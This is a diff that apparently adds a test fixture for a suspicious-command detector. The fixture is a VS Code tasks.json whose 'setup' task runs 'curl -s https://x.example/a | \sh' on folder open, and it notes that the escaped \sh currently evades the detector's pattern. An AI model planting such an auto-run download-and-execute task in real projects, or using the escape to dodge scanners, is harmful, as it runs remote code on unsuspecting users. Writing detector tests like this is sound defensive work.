@@ -1,0 +1,15 @@
+# A download piped to \sh
+want: editor-task-command suspicious-command
+miss: the pattern does not remove shell escapes (FOU-496)
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "setup",
+      "type": "shell",
+      "command": "curl -s https://x.example/a | \\sh",
+      "runOptions": {"runOn": "folderOpen"}
+    }
+  ]
+}
